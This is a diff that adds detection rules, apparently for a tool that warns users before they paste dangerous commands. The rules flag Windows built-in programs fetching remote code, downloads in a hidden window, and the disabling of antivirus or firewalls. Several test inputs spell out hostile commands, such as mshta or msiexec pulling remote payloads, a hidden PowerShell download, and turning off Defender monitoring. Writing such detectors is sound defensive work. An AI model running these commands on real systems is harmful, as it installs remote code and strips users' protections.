@@ -1,0 +1,68 @@
+# Windows Run-dialog / PowerShell specifics.
+schema = 1
+
+[[rule]]
+id = "PP020"
+title = "Built-in Windows program used to fetch or run remote code"
+severity = "danger"
+score = 75
+platforms = ["windows"]
+all = ["lolbin_remote"]
+explain = "Uses {tool}, a built-in Windows program, to download or run code from {host}. Attackers use these programs because Windows trusts them."
+advice = "Do not run this. Close the page that asked you to press Win+R and paste it."
+references = ["https://attack.mitre.org/techniques/T1218/", "https://lolbas-project.github.io/"]
+
+[[rule.test]]
+input = "mshta https://pp-fixture-3.icu/v"
+expect = "match"
+
+[[rule.test]]
+input = "msiexec /i https://pp-fixture-4.top/setup.msi /qn"
+expect = "match"
+
+[[rule.test]]
+input = "msiexec /i C:\\Downloads\\app.msi"
+expect = "no-match"
+
+[[rule]]
+id = "PP021"
+title = "Runs in a hidden window"
+severity = "danger"
+score = 65
+platforms = ["windows"]
+all = ["hidden_window"]
+any = ["download", "download_exec", "lolbin_remote", "encoded_command", "decode_exec"]
+explain = "Downloads or runs code from {host} in a hidden window so you don't see it happen."
+advice = "Do not run this."
+references = ["https://attack.mitre.org/techniques/T1564/003/"]
+
+[[rule.test]]
+input = "powershell -w hidden -c \"iwr https://get.example/a -OutFile $env:TEMP\\a.exe\""
+expect = "match"
+
+[[rule.test]]
+input = "powershell -w hidden -c Get-Date"
+expect = "no-match"
+
+[[rule]]
+id = "PP022"
+title = "Turns off security protection"
+severity = "danger"
+score = 80
+platforms = ["linux", "macos", "windows"]
+all = ["security_tamper"]
+explain = "Tries to switch off or weaken security protection (antivirus, firewall, Gatekeeper or SELinux), or to wipe your command history while downloading code."
+advice = "Do not run this unless you are an administrator who knows exactly why it is needed."
+references = ["https://attack.mitre.org/techniques/T1562/001/"]
+
+[[rule.test]]
+input = "Set-MpPreference -DisableRealtimeMonitoring $true"
+expect = "match"
+
+[[rule.test]]
+input = "sudo ufw disable"
+expect = "match"
+
+[[rule.test]]
+input = "sudo ufw enable"
+expect = "no-match"
